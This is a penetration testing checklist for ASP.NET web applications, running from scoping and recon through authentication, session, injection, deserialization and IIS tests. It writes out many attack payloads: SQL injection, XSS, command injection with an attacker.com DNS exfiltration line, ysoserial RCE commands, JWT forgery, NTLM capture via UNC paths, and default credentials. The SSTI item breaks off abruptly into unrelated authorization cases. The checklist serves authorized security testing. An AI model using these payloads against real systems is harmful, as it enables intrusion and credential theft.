items.name: Define Scope & Rules of Engagement
items.how: Document all in-scope URLs, IP ranges, domains, excluded paths, and test window in a written agreement signed by all parties before any testing begins.
cases: List every in-scope host, URL path, and IP range
Explicitly list excluded paths: /payment-gateway, live-db, DR systems
Define testing window: start/end datetime with timezone
Define emergency stop procedure and escalation contacts
Document what constitutes out-of-scope (third-party integrations, CDN endpoints)
Get written authorization signed by asset owner
items.expected: Signed scope document with no ambiguity. Out-of-scope paths clearly listed. Written authorization obtained.

items.name: Confirm Testing Window & Emergency Contacts
items.how: Agree on date/time restrictions, blackout periods, and emergency contacts. Document rollback procedures.
cases: Define off-peak testing hours if production environment
Establish rollback/stop procedure in case of unintended impact
Identify emergency contacts on client side (name, phone, email)
Document acceptable source IP addresses for testing
Confirm whether DoS-style tests (rate limiting, race conditions) are permitted
items.expected: Testing schedule agreed. Emergency stop procedure documented. Contact list in place. Source IPs whitelisted.

items.name: Document Target Tech Stack
items.how: Identify ASP.NET version, .NET CLR, IIS version, SQL Server, frontend frameworks, CDN, WAF prior to active testing.
cases: Check response headers for X-AspNet-Version, X-Powered-By in any response
Run: whatweb https://target.com
Use Wappalyzer browser extension while browsing the target
Note: .NET version, IIS version, JavaScript frameworks, database indicators
Identify WAF/CDN: Cloudflare, Akamai, AWS CloudFront (affects testing approach)
Note API style: REST, GraphQL, OData, SOAP/WSDL
items.expected: Tech stack inventory completed: OS, web server+version, framework+version, database, CDN, WAF. Payloads can now be targeted.

items.name: Configure Burp Suite & OWASP ZAP
items.how: Set up both Burp Suite and ZAP as proxies. Install CA certificates. Configure target scope.
cases: Burp: Proxy → Listeners → 127.0.0.1:8080 | Import Burp CA cert into Firefox
ZAP: Listen on 127.0.0.1:8081 | Import ZAP root CA
Set Burp target scope to target domain to filter noise
Enable Burp passive scan in background while browsing
ZAP: Configure Ajax Spider for React/Angular/Vue SPAs
Test intercept: visit https://target.com → confirm request captured in both tools
items.expected: All browser HTTPS traffic intercepted without SSL errors. Passive scan running in background.

items.name: Create Project Folder Structure & Test Accounts
items.how: Set up organised directories for evidence. Obtain or create test accounts for each role type.
cases: mkdir -p project/{recon,scans,screenshots,findings,reports}
Document all tool versions used in a README.txt
Obtain: unauthenticated access (no account needed)
Obtain: low-privilege user account (test1@target.com)
Obtain: admin/privileged account (if in scope)
Obtain: API keys/tokens for API testing
Confirm test accounts are isolated from real user data
items.expected: Folder structure in place. Test accounts for each role available and documented securely.

items.name: Search Engine Discovery (Google Dorking)
items.how: Use advanced search operators to find exposed files, login pages, error messages, and config files indexed by search engines.
cases: site:target.com filetype:pdf — exposed documents
site:target.com inurl:admin OR inurl:administrator — admin pages
site:target.com "error" OR "exception" OR "stack trace" — verbose errors
site:target.com ext:config OR ext:bak OR ext:sql OR ext:old — config/backups
site:target.com inurl:api OR inurl:swagger OR inurl:api-docs — API endpoints
intext:"target.com" filetype:xls OR filetype:xlsx — data exports
site:target.com inurl:login OR inurl:signin — login pages
intitle:"index of" site:target.com — directory listings
items.expected: No sensitive files, admin interfaces, credentials, or verbose errors indexed by search engines.

items.name: Fingerprint Web Server
items.how: Analyze HTTP response headers, error pages, and timing to identify web server software and version.
cases: Send GET / via Burp Repeater → inspect all response headers
Look for: Server: Microsoft-IIS/10.0 (version disclosure)
Look for: X-Powered-By: ASP.NET, X-AspNet-Version: 4.0.30319
Trigger 404 → check default error page format (IIS vs nginx vs Apache)
Send invalid HTTP verb → check error response format
ETag header format differs between web servers
nmap -sV -p 443 target.com — OS/service fingerprint
items.expected: Server headers must NOT reveal version numbers. X-AspNet-Version and X-Powered-By absent from all responses.

items.name: Review Webserver Metafiles
items.how: Request robots.txt, sitemap.xml, and .well-known resources to enumerate paths and application structure.
cases: GET /robots.txt — note ALL Disallow entries (potential high-value targets)
GET /sitemap.xml — enumerate all mapped URLs
GET /sitemap_index.xml — index of multiple sitemaps
GET /.well-known/security.txt — contact info and policy disclosure
GET /.well-known/openid-configuration — OIDC endpoint discovery
GET /crossdomain.xml — Flash cross-domain policy
GET /clientaccesspolicy.xml — Silverlight policy
items.expected: robots.txt does not reveal sensitive internal paths. Sitemap covers only public content.

items.name: Enumerate Applications on Webserver
items.how: Discover all web applications on the same server using port scanning, virtual hosting, and subdomain enumeration.
cases: Test virtual host routing: modify Host header to known subdomains
Test: dev., staging., test., uat., api., admin., portal. subdomains
gobuster vhost -u https://target.com -w subdomains.txt
Check for apps on non-standard ports
Test HTTP/2 vs HTTP/1.1 responses for differences
items.expected: All applications on server catalogued. Unexpected apps on non-standard ports is a finding.

items.name: Webpage Content Information Leakage
items.how: Review HTML source, JavaScript files, and comments for credentials, API keys, internal paths, and developer notes.
cases: View-source on EVERY page: Ctrl+U → search: password, apikey, secret, token, TODO, FIXME, debug, internal
Open DevTools → Sources → review ALL .js files for hardcoded secrets
Search .js: Authorization, Bearer, Basic, api_key, private_key, connectionString, AWS_ACCESS
Check HTML meta tags for: generator, internal URLs, build IDs
Check for email addresses in source (staff enumeration for phishing awareness)
Check data- HTML attributes for sensitive values
Search for internal domains: .internal, .corp, .local, 192.168., 10.0.
items.expected: No credentials, API keys, tokens, or sensitive internal information in client-side code.

items.name: WHOIS, DNS & Passive Reconnaissance
items.how: Run WHOIS and DNS enumeration to find org contacts, subdomains, and attempt zone transfer. Search Shodan/Censys/Wayback.
cases: whois target.com — registrar, org, email contacts
dig target.com ANY — all DNS records
dig axfr @ns1.target.com target.com — zone transfer (should return REFUSED)
dnsenum target.com — automated DNS enum
crt.sh: https://crt.sh/?q=%.target.com — subdomain discovery via cert transparency
Shodan.io: search target IP — open ports, banners, SSL certs
archive.org/web — old pages, removed endpoints, legacy parameters
LinkedIn / job postings — tech stack, internal tool names
Hunter.io — employee email patterns for phishing awareness
items.expected: Zone transfer disabled. No internal hostnames disclosed via DNS. SPF/DKIM/DMARC properly configured.

items.name: Port Scanning & Service Detection
items.how: Run full TCP port scan with service and version detection to discover all open services.
cases: nmap -sV -sC -p- --open target.com -oA scan_output (full scan)
Check for management ports: 3389 (RDP), 22 (SSH), 8080/8443 (admin), 21 (FTP)
masscan -p1-65535 target.com --rate=1000 (fast large-range)
Identify plaintext services: FTP, Telnet, HTTP (not HTTPS), SMTP without STARTTLS
Banner grab: nc -v target.com PORT
items.expected: Only necessary ports open externally. Management ports restricted to VPN/internal only. No plaintext services.

items.name: Directory & File Brute-Force
items.how: Use wordlists to discover hidden directories, backup files, admin pages, and .NET-specific sensitive paths.
cases: gobuster dir -u https://target.com -w directory-list-2.3-medium.txt -x aspx,ashx,asmx,config,bak,old,log,txt,json
Look for: /admin, /administrator, /manage, /backup, /api, /.git, /web.config, /appsettings.json
.NET specific: /App_Data/, /App_Code/, /elmah.axd, /trace.axd, /ScriptResource.axd, /WebResource.axd
Try: web.config.bak, appsettings.json.old, web.config~, appsettings.Development.json
ffuf -w wordlist.txt -u https://target/FUZZ -mc 200,301,302,403
feroxbuster -u https://target.com -x aspx,ashx --depth 3
Check response 403 pages — they confirm existence even if access denied
items.expected: No backup files, git repos, admin interfaces, or sensitive config files web-accessible.

items.name: GitHub / Source Code Leakage
items.how: Search GitHub, GitLab, and other repositories for leaked credentials, API keys, config files.
cases: GitHub: org:companyname password OR secret OR api_key OR apikey
GitHub: filename:.env target.com
GitHub: filename:web.config connectionstring
GitHub: filename:appsettings.json company OR target
GitLeaks: gitleaks detect on any found repos
truffleHog on repositories: trufflehog git https://github.com/target/repo
Search: "target.com" in:file language:yaml (CI/CD config secrets)
Search: "smtp.target.com" OR "db.target.com" in GitHub code
items.expected: No credentials, API keys, connection strings, or internal config leaked in public repositories.

items.name: Subdomain Takeover
items.how: Check DNS CNAME records for entries pointing to unclaimed cloud services (Azure, AWS, GitHub Pages, Heroku).
cases: subfinder -d target.com -o subs.txt — enumerate subdomains
amass enum -d target.com — comprehensive subdomain enum
For each subdomain: dig CNAME sub.target.com — what does it point to?
Look for: NXDOMAIN responses on CNAME targets = potential takeover
Check unclaimed Azure: .azurewebsites.net | GitHub: .github.io | Heroku: .herokuapp.com
subjack -w subs.txt -t 100 -timeout 30 -o results.txt
can-i-take-over-xyz for automated fingerprinting
items.expected: All subdomains resolve to active owned resources. No dangling DNS CNAME entries pointing to unclaimed services.

items.name: Parameter Discovery
items.how: Discover hidden or undocumented GET/POST parameters on known endpoints.
cases: arjun -u https://target.com/page --get — discover hidden GET params
arjun -u https://target.com/api/endpoint --post — POST params
Burp Param Miner: right-click request → Guess params (Community: manual)
Test common hidden params: debug, test, admin, id, user, token, redirect, returnUrl, callback
Test .NET-specific: __VIEWSTATE, __EVENTVALIDATION, __RequestVerificationToken, __EVENTTARGET
Try adding: ?_method=DELETE, ?format=json, ?callback=test (JSONP)
items.expected: All parameters documented. No hidden debug/admin parameters in production.

items.name: Spider / Crawl Application
items.how: Crawl the entire application using Burp and ZAP. Use Ajax Spider for JS-heavy SPAs. Browse as all user roles.
cases: Burp: right-click host → Spider this host / Discover Content
ZAP → Analyse → Spider (traditional) | Ajax Spider (React/Angular/Vue SPA)
Browse as: unauthenticated, low-privilege user, admin (capture all role-specific functionality)
Map all multi-step flows: registration, checkout, password reset, MFA enrollment
DevTools Network tab: catch requests not proxied through Burp
Document: all forms, their method (GET/POST) and action URLs
items.expected: Complete sitemap in Burp. All forms, API endpoints, and entry points catalogued by role.

items.name: Map All Entry Points
items.how: Systematically identify every location where user-controlled input enters the application.
cases: GET/POST URL parameters: ?id=1, ?search=test
URL path segments (REST): /api/users/{id}/profile
HTTP headers: Cookie, Referer, User-Agent, X-Forwarded-For, X-Forwarded-Host, custom headers
JSON/XML body parameters
File upload endpoints (filename, content, metadata)
WebSocket messages (if present)
Hidden HTML form fields
GraphQL query parameters, mutation inputs, variables
items.expected: Complete entry point inventory. Every entry point is a potential injection or access control vector.

items.name: JavaScript File Analysis
items.how: Review all JavaScript files for hardcoded credentials, hidden API endpoints, internal paths, and sensitive logic.
cases: Burp → Target → Site Map → filter .js files → review each file
LinkFinder: python linkfinder.py -i https://target.com/app.js -o cli
Search JS for: apiKey, api_key, password, secret, Bearer, Authorization, /api/, connectionString
Check for .js.map source maps — may expose original pre-compiled TypeScript/source
Check React/Vue/Angular bundles: credentials in .env not excluded from build?
Search for hardcoded internal URLs: .internal, .corp, 192.168., 10.0.
Check localStorage.setItem() calls for sensitive token storage
items.expected: No credentials or API keys in JavaScript. No hidden admin API endpoints client-side. No source map exposure.

items.name: ViewState Analysis (ASP.NET WebForms)
items.how: Check ViewState presence, MAC protection, and sensitive data disclosure.
cases: Find __VIEWSTATE hidden field in page HTML source
Burp Decoder → Base64 decode __VIEWSTATE value → inspect content
Check if sensitive user data appears in decoded ViewState
Tamper a byte in ViewState → resubmit → should cause MAC error (good = protected)
Silent acceptance of tampered ViewState = MAC disabled = critical finding
Check web.config for: enableViewStateMac="false" or viewStateEncryptionMode
Also check: __EVENTVALIDATION field — should also be MAC protected
items.expected: ViewState MAC-protected. Tampering causes validation error. No sensitive data in plaintext ViewState.

items.name: API Endpoint Discovery
items.how: Discover API documentation, all endpoints, versioning, and authentication requirements.
cases: Browse to: /swagger, /swagger/index.html, /swagger/ui/index, /api-docs, /openapi.json, /v2/api-docs
Check JS files for /api/ endpoint references
Test API versions: /api/v1/ vs /api/v2/ vs /api/v3/ (older versions may have weaker auth)
Check .NET OData: /api/$metadata (exposes full data schema)
OPTIONS request on /api/ routes — lists allowed methods and CORS headers
GraphQL: /graphql, /api/graphql, /v1/graphql
items.expected: API documentation not publicly accessible in production. All API endpoints require authentication. Old versions deprecated.

items.name: WebSocket Discovery & Analysis
items.how: Identify and analyze WebSocket connections for auth, authorization, and injection issues.
cases: Browser DevTools → Network → WS tab → capture all WebSocket messages
Burp → WebSockets history → review all message frames
Does WebSocket connection include auth token in upgrade request? (Sec-WebSocket-Protocol?)
Test: modify WebSocket upgrade request → access other users data?
Inject XSS/SQLi payloads in WebSocket message fields
Replay captured WebSocket messages in Burp → are they server-validated?
Test: connect without auth token — server should reject
items.expected: WebSocket connections require authentication. All messages validated server-side. No injection possible via WS messages.

items.name: Credentials Over Encrypted Channel
items.how: Verify all credential submissions are made exclusively over HTTPS, never over HTTP.
cases: Open login page on HTTP — does it force redirect to HTTPS before form renders?
Check form ACTION attribute: points to https:// URL?
Intercept login POST in Burp — TLS-encrypted connection used?
Check password reset form submission — HTTPS only?
Test API auth endpoints over HTTP — rejected?
HSTS header on login domain: Strict-Transport-Security present and correct?
Check all API endpoints: Bearer token sent over HTTP anywhere?
items.expected: All credential submissions over HTTPS only. HTTP redirects before form action. HSTS present with max-age >= 31536000.

items.name: Default Credentials Testing
items.how: Test all login and management interfaces for commonly known default credentials.
cases: Try: admin/admin, admin/password, admin/123456, admin/[blank], admin/admin123
Try: administrator/administrator, sa/sa (MSSQL), test/test, guest/guest
Check management portals if accessible: IIS Manager, MSSQL SA, phpMyAdmin
Shodan: check if target services have known default creds
Check system-generated accounts (installer accounts, service accounts)
Try: company name as both username and password
Try first name / last name combinations from LinkedIn staff enumeration
items.expected: No default credentials accepted on any login interface. All accounts have unique strong passwords.

items.name: Account Lockout & Rate Limiting
items.how: Test whether the application enforces account lockout or rate limiting after repeated failed attempts.
cases: Submit 10+ failed login attempts for same account — lockout or rate limit?
Test lockout bypass: X-Forwarded-For: 1.2.3.4 → 1.2.3.5 → 1.2.3.6 header rotation
Test lockout bypass: X-Real-IP, X-Originating-IP, CF-Connecting-IP header spoofing
Distribute attempts over time (1 per minute) — lockout still applies?
Test: does lockout apply to password reset too?
Test: does lockout apply to OTP/MFA entry page?
Check lockout duration — too short (30 seconds) = ineffective
items.expected: Lockout after 5-10 failed attempts OR rate limiting enforced. Lockout cannot be bypassed via IP header spoofing.

items.name: Authentication Bypass
items.how: Attempt to bypass the authentication mechanism using SQL injection, forced browsing, and response manipulation.
cases: SQL injection in login: admin'-- in username field
' OR '1'='1' -- in password field with any username
Navigate directly to /dashboard, /admin, /profile without any session
Intercept login 302 redirect: change response to 200 OK → does page render?
Add URL params: ?debug=true, ?admin=1, ?authenticated=true, ?bypass=1
Test login with empty username AND empty password
SAML response manipulation if SSO used: change NameID or role attribute
Try null bytes: username=admin%00' in login fields
items.expected: No authentication bypass possible. Direct URL access to authenticated pages redirects to login.

items.name: Password Policy Testing
items.how: Test password policy enforcement at registration, password change, and password reset.
cases: Register with: a (1 char — too short)
Register with: 12345678 (numeric only)
Register with: password (dictionary word)
Register with: aaaaaaaa (all same character)
Register with: Password1 (minimal complexity — should fail if policy strong)
Check minimum length enforced (should be >= 12 chars)
Check if common/breached passwords rejected: haveibeenpwned API integration?
Test if username cannot be used as password
Test same policy on: registration + password change + password reset forms
items.expected: Minimum 12 characters with complexity (upper, lower, digit, symbol). Common/breached passwords rejected.

items.name: Password Reset Functionality
items.how: Test the password reset flow for token security, expiry, reuse, enumeration, and host header injection.
cases: Request reset → analyze email token: length, character set, entropy
Request 2 resets in sequence — are tokens sequential or predictable?
Test token expiry: use a 2-hour-old token → must fail
Test single-use: consume token, then use it again → must fail
Host header injection: change Host: attacker.com → check if reset link uses attacker domain
Test: X-Forwarded-Host: attacker.com same as above
Email enumeration: does "email sent" confirm account exists?
Reset link still valid after victim changes password? (Should be invalidated)
Security question bypass if used: try common answers, SQL injection in answer field
items.expected: Tokens are random (>=128 bits entropy), single-use, expire <=30 min. Host header not reflected in reset emails.

items.name: Multi-Factor Authentication (MFA) Testing
items.how: Test MFA implementation for bypass, OTP brute force, code reuse, and step-skipping.
cases: After login step 1: navigate directly to post-MFA URL — works without MFA?
Try submitting expired OTP codes (>30 seconds old)
OTP brute force on MFA page: does rate limiting / lockout apply? (000000→999999)
Submit empty OTP code — does server accept it?
Can MFA be disabled without re-authentication?
Backup codes: are they single-use? Sufficient entropy (>=8 chars)?
TOTP time window: does server accept codes from 5+ minutes ago?
Test account recovery: can recovery bypass MFA entirely?
items.expected: MFA cannot be skipped. OTPs expire after 30s. Brute force protection on OTP page. Recovery flow also requires strong verification.

items.name: Account Enumeration
items.how: Test login, registration, and password reset flows for differences revealing valid account existence.
cases: Login: compare exact error text for valid vs invalid username
Login: measure response TIME for valid vs invalid username (timing oracle)
Password reset: does it confirm "email sent" only for valid emails?
Registration: does it say "email already registered" vs "registered successfully"?
Burp Intruder: send username list → compare response sizes/codes
API: test /api/users/check-email or /api/register endpoint
API: test /users/{username} — does 404 vs 403 reveal existence?
items.expected: Identical generic responses and response times for valid/invalid accounts. No account enumeration possible.

items.name: Session Token Analysis
items.how: Analyze session token randomness, encoding, predictability, and information disclosure.
cases: Collect 10+ session tokens by logging in/out repeatedly
Burp → Sequencer → load tokens → run full analysis → check FIPS pass/fail
Decode tokens: is it Base64? JWT? Custom encoding? Timestamp-based?
Does token contain user ID, role, or timestamp in plaintext?
Token length: should be >= 128 bits (32 hex chars minimum)
Change one character in token → does session remain valid? (It should not)
ASP.NET_SessionId: 24-char Base64 = 128-bit random? Run through Sequencer
items.expected: Tokens pass Burp Sequencer FIPS analysis. No predictable pattern. No user data embedded. >=128 bits entropy.

items.name: Cookie Security Attributes
items.how: Inspect all session and auth cookies for Secure, HttpOnly, SameSite, Domain, and Path attributes.
cases: Browser DevTools → Application → Cookies → inspect EVERY cookie
Burp: check all Set-Cookie response headers during browsing
Missing Secure flag: session cookie transmittable over HTTP → session hijacking
Missing HttpOnly: JavaScript can read cookie → XSS leads to session theft
SameSite=None without Secure: CSRF risk
SameSite not set: defaults to browser behavior (risky on older browsers)
Domain attribute too broad: .target.com allows all subdomains → subdomain XSS risk
.NET: check ASP.NET_SessionId, .ASPXAUTH, .ASPXROLES, __RequestVerificationToken
items.expected: All session cookies: Secure=true, HttpOnly=true, SameSite=Strict or Lax. Minimal Domain/Path scope.

items.name: Session Fixation
items.how: Test if the application regenerates the session token after successful authentication.
cases: Capture session token BEFORE login (unauthenticated request gets cookie)
Complete the login process
Compare session cookie value BEFORE and AFTER login — must be DIFFERENT
If same token used before and after login = session fixation vulnerability
Test: manually set a custom session cookie value before login → accepted post-auth?
Test: does token change after MFA completion (second auth step)?
Test: does token change after privilege change (e.g. user becomes admin)?
items.expected: Session token regenerated on authentication. Pre-auth token invalidated after successful login.

items.name: Logout & Session Invalidation
items.how: Test that logout invalidates the server-side session and that old tokens cannot be reused.
cases: Log in → copy session cookie → log out → replay old cookie in Burp Repeater
Old cookie must return 401 or redirect to login, NOT serve authenticated content
Test logout from all devices/sessions option (if available)
JWT after logout: token still validates? (Server must blacklist or use short-lived tokens)
Test session expiry: wait beyond session timeout → old cookie still works?
Test: refresh access token after logout → should fail
items.expected: Session token invalidated server-side on logout. Old tokens return 401. JWT tokens added to server denylist or short-lived (<15min).

items.name: JWT Testing
items.how: Test JWT implementation for algorithm confusion, weak secrets, claim manipulation, and missing validation.
cases: Decode at jwt.io → inspect header algorithm and payload claims
alg:none attack: change "alg":"HS256" → "alg":"none", remove signature → submit
Change payload claims: role:user → role:admin, isAdmin:false → isAdmin:true
RS256→HS256 confusion: sign token with server public key as HMAC secret
Brute force weak secret: hashcat -a 0 -m 16500 token.txt rockyou.txt
jwt_tool -T token.txt — automated JWT attacks (tamper all options)
Expired token (exp claim in past): server should reject
kid header injection: "kid":"../../appsettings.json" → path traversal in key lookup
Null signature: submit token with empty signature field
items.expected: JWT uses RS256 or ES256. alg:none rejected. Claims cannot be tampered. Expired tokens rejected. No weak HMAC secret.

items.name: SQL Injection
items.how: Test all input parameters for SQL injection using manual probes, blind techniques, and automated tools. Test EVERY vector.
cases: Add ' to every input field → look for DB errors (Incorrect syntax near..., ORA-, MySQL error)
Error-based: ' ORDER BY 100-- (reveals column count via error)
Boolean: ' AND 1=1-- (true response) vs ' AND 1=2-- (false) → compare content/length
MSSQL time-based: '; WAITFOR DELAY '0:0:5'-- (5 second delay)
MySQL time-based: ' AND SLEEP(5)--
Test ALL vectors: URL params, POST body, cookies, headers (User-Agent, Referer, X-Forwarded-For)
sqlmap -u 'https://target.com/page?id=1' --batch --dbs --level=3 --risk=2
sqlmap POST: sqlmap -u URL --data='param=value&id=1' --batch
Out-of-band: sqlmap --technique=E (DNS exfil via xp_dirtree)
Second-order SQLi: inject payload that executes when data is used later
items.expected: No SQL injection. Parameterized queries/ORM used throughout. All errors generic (no DB-specific messages).

items.name: Reflected XSS
items.how: Inject XSS payloads into all reflected inputs: URL params, search, error messages, header-reflected values.
cases: <script>alert(1)</script> in every GET/POST param
"> — attribute context breakout
<svg onload=alert(1)> — HTML5 SVG vector
javascript:alert(1) — href/src attribute injection
Case bypass: <ScRiPt>alert(1)</ScRiPt>
Double encoding: %253Cscript%253Ealert(1)%253C/script%253E
Test reflected HTTP headers: Referer, User-Agent, Accept-Language headers
.NET Request Validation bypass: %00<script>alert(1)</script>
XSStrike: xsstrike.py -u "https://target.com/search?q=test"
items.expected: All user input HTML-encoded before reflection. CSP without unsafe-inline. No XSS payload executes.

items.name: Stored XSS
items.how: Inject XSS into persistent fields and verify execution when rendered to other users or admins.
cases: Store <script>alert(document.cookie)</script> in comment/note/bio fields
Store XSS in username/display name → fires when admin views user list
Store XSS in address, support ticket, shipping notes, feedback fields
Store XSS in fields shown in admin panel: user agent, IP, referrer logs
SVG file upload: <svg><script>alert(document.domain)</script></svg>
Stored XSS in email field if shown in admin UI: <script>...</script>@test.com
Test all user-controlled data that is later displayed to other users
items.expected: All stored input HTML-encoded before rendering. Stored XSS cannot execute in any context.

items.name: DOM-Based XSS
items.how: Inspect JavaScript for dangerous sinks receiving user-controlled data without sanitization.
cases: Search JS for dangerous sinks: document.write, innerHTML, outerHTML, eval, setTimeout(str)
Search JS for sources: location.hash, location.search, location.href, document.URL, document.referrer
Test URL fragment: https://target.com/page#">
Test search param flowing to innerHTML: ?name=
postMessage handlers: send crafted message to window → XSS in handler?
DevTools → Sources → search for innerHTML = | document.write( | eval(
items.expected: No dangerous sinks receive unsanitized user input. textContent used over innerHTML. DOMPurify used if HTML needed.

items.name: OS Command Injection
items.how: Test inputs that may reach OS commands: file names, IP fields, ping, DNS lookup, hostnames, scheduler.
cases: Windows: & whoami | whoami ; whoami || whoami && whoami
Linux: ; id | id && id `id` $(id)
Blind Windows: & ping -n 5 127.0.0.1 (5-second delay = blind CMDi)
Blind Linux: ; sleep 5
OOB: ; nslookup $(whoami).attacker.com (use interactsh)
commix --url "https://target.com/?field=INJECT_HERE" --batch
Test ALL potentially OS-touching inputs: filename, hostname, IP, port, search, email subject, scheduler, report gen
items.expected: No OS command injection. User input never reaches system() / Process.Start(). Whitelist validation on OS-touching fields.

items.name: Server-Side Template Injection (SSTI)
items.how: Test template engine injection by injecting mathematical expressions that template engines evaluate.
cases: {{7*7}} → if 49 in response: Jinja2 / Twig / Pebble
${7*7} → Java Freemarker / Velocity
<%= 7*7 %> → Ruby ERB
@(7*7) → .NET Razor template
#{7*7} → Thymeleaf (Java)
{{7*'7'}} → Twig differentiation (returns 7777777)

DELETE /api/admin/users/1 as regular user → 403?
GET /api/admin/reports as regular user → 403?
PUT /api/users/102/role with {"role":"admin"} as regular user → 403?
POST /api/products (create product) as buyer role → 403?
GET /api/admin/users — HTTP method switch: try GET if POST is documented
Access undocumented admin endpoints found in JS files
items.expected: Function-level authorization enforced server-side. Admin API endpoints return 403 for non-admin authenticated tokens.

items.name: API6-8:2023 — Mass Assignment, Misconfiguration, Injection
items.how: Test API-specific mass assignment, security misconfiguration, and injection issues.
cases: Mass assignment: POST with {"name":"x","isAdmin":true,"balance":99999}
Swagger exposed: /swagger | /api-docs | /openapi.json → blocked in prod?
CORS: Access-Control-Allow-Origin: * with credentials? Permissive origin policy?
API over HTTP: any API endpoint accessible without TLS?
GraphQL injection: {user(id:"1 UNION...")} or SSTI in arguments
Error verbosity: do API errors expose stack traces, SQL errors, internal paths?
Unnecessary HTTP methods on API: DELETE/PUT on read-only endpoints?
items.expected: Swagger absent in production. CORS restrictive. All API endpoints over HTTPS. Generic error messages.

items.name: GraphQL Security Testing
items.how: Test GraphQL endpoints for introspection, authorization bypass, injection, and denial of service.
cases: Introspection: {__schema{types{name}}} → disabled in production? (Must be)
Field suggestion: send invalid field → "Did you mean...?" leaks schema structure
Query all fields on object types → excessive data exposure?
Authorization: query {user(id:1){secretField}} as unauthorized user → 403?
Injection in args: {user(id:"1; DROP TABLE users--")} | SSTI in string args
Batching DoS: send 1000 queries in single request → rate limited?
Alias attack: multiple queries in one request bypassing rate limits
Nested query DoS: {a{b{c{d{e{f{...}}}}}}} → depth limit enforced?
items.expected: Introspection disabled. Per-field authorization enforced. Query depth/complexity limits set. Batching rate-limited.

items.name: ViewState Deserialization (MAC Disabled)
items.how: Test if ViewState MAC validation is disabled, enabling RCE via crafted deserialization payload.
cases: Find __VIEWSTATE field in form HTML source
Tamper one byte in Base64 ViewState value → resubmit
Expected: MAC validation error (ViewState is invalid) — this is GOOD
Not expected: page loads normally with tampered ViewState — MAC DISABLED = CRITICAL
If MAC disabled: ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "whoami > C:\inetpub\wwwroot\poc.txt"
Submit crafted ViewState → check for /poc.txt → confirm RCE
Machine key discovery: Blacklist3r — try known default machine keys list
Verify web.config: enableViewStateMac="false" or viewStateEncryptionMode="Never"
items.expected: ViewState MAC validation always enabled. Tampered ViewState causes InvalidViewStateException. Machine key not exposed.

items.name: .NET Deserialization (Json.NET / BinaryFormatter)
items.how: Test .NET JSON and binary deserialization endpoints for arbitrary type instantiation and RCE.
cases: Test JSON.NET $type: add "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework" to JSON body
Json.NET gadget: $type → Windows.Data → RCE via Process.Start
BinaryFormatter payload: ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami"
Submit Base64-encoded BinaryFormatter payload in cookies or body parameters
Check for JavaScriptSerializer with SimpleTypeResolver (type disclosure in __type field)
DataContractSerializer with known type list: can arbitrary type be injected?
WCF endpoints (.svc): test with ysoserial WCF gadget chains
items.expected: TypeNameHandling=None in all Json.NET usage. BinaryFormatter disabled (.NET 7+ throws by default). Only safe types allowed.

items.name: Open Redirect in .NET Applications
items.how: Test redirect parameters in ASP.NET login, logout, and navigation flows for open redirect to external domains.
cases: ?ReturnUrl=https://evil.com — classic ASP.NET login redirect
?redirect=//evil.com (protocol-relative URL)
?next=https://evil.com | ?url=javascript:alert(1)
URL encoded: ?ReturnUrl=%2F%2Fevil.com
After login redirect: is ReturnUrl validated against internal paths only?
Bypass: ?ReturnUrl=https://target.com.evil.com (subdomain of target)
Bypass: ?ReturnUrl=https://target.com@evil.com (@ username trick)
Bypass: ?ReturnUrl=https://evil.com#https://target.com (fragment)
items.expected: ReturnUrl and all redirect parameters validated against allowlist of internal relative paths. External URLs rejected.

items.name: Padding Oracle Attack
items.how: Test for padding oracle vulnerability in ASP.NET applications using custom CBC-mode encryption.
cases: Identify encrypted values in cookies or URL params (look for Base64 of multiples of 16 bytes)
Check .ASPXAUTH cookie if using non-default encryption settings
Modify a single byte in ciphertext → observe if error differs from other errors (oracle)
PadBuster: padbuster https://target.com/page ENCVALUE 8 -encoding 0 -cookie "auth=ENCVALUE"
POET (Padding Oracle Exploitation Tool) for automated testing
If oracle confirmed: PadBuster can decrypt ciphertext or encrypt arbitrary plaintext
ASP.NET specific: MachineKey-based encryption in older .NET WebForms apps
items.expected: No observable difference in error responses for valid vs invalid padding. Uniform error handling regardless of padding.

items.name: Machine Key & Forms Auth Ticket Forgery
items.how: Test if the .NET machine key can be identified to forge Forms Authentication tickets, ViewState, or session data.
cases: Check /web.config direct access — look for <machineKey validationKey="..." decryptionKey="...">
Check /elmah.axd error log — may contain config details or machine key info
Search GitHub for company machine key disclosure in committed configs
If machine key found: Blacklist3r → forge .ASPXAUTH cookie with arbitrary username + roles
ysoserial.net -g TypeConfuseDelegate -f ViewState -c "whoami" --path "/path/page.aspx" --apppath "/"
Test known default/weak machine keys list (publicly available databases)
Burp: replace .ASPXAUTH cookie with forged value → request authenticated page
items.expected: Machine key not exposed in any web-accessible file. No default or weak machine key used. Config files inaccessible.

items.name: IIS Misconfiguration & Tilde Enumeration
items.how: Test for IIS-specific misconfigurations: WebDAV, 8.3 filename disclosure, handler mappings, default pages.
cases: IIS tilde enumeration: GET /~1/ HTTP/1.1 → IIS 8.3 short filename disclosure
GET /s~1/ → discover files starting with s (e.g. secret.aspx → s~1.asp)
OPTIONS / → check for WebDAV methods: PROPFIND, MKCOL, PUT, LOCK
PROPFIND / HTTP/1.1 → WebDAV discovery response
Check /iisstart.htm — default IIS welcome page = version disclosure
Handler mapping: try /file.aspx. (trailing dot) | /file.config.ashx
ASMX: try /?wsdl on .asmx endpoints → SOAP WSDL schema exposure
items.expected: WebDAV disabled. IIS tilde enumeration mitigated (URLScan or RequestFiltering). No default IIS pages. No WSDL in prod.

items.name: .NET SSRF via HttpClient / WebClient
items.how: Test .NET-specific SSRF vectors including file:// protocol and UNC path NTLM credential capture.
cases: Identify server-side URL fetching: HttpClient, WebClient, WebRequest, HttpWebRequest usage
File protocol: file:///C:/windows/win.ini in URL parameters
UNC path SSRF: \\attacker.com\share\ (triggers NTLM auth to attacker)
Responder to capture NTLM hash: responder -I eth0
AWS metadata: http://169.254.169.254/latest/meta-data/
Internal service discovery via SSRF: http://127.0.0.1:PORT (enumerate internal ports)
Test PDF generation features: load external URL in wkhtmltopdf or similar
Test: are DNS-only lookups possible (SSRF for internal hostname enumeration)?
items.expected: URL parameters validated against strict allowlist. UNC paths rejected. File protocol blocked. Cloud metadata unreachable.

items.name: OWASP ZAP Passive & Active Scan
items.how: Run ZAP passive scan during manual browsing and active scan after authentication is configured.
cases: Configure browser to proxy through ZAP (127.0.0.1:8081)
Browse entire application while logged in as each user role
ZAP Alerts tab → review all passive findings (sort by Risk: High first)
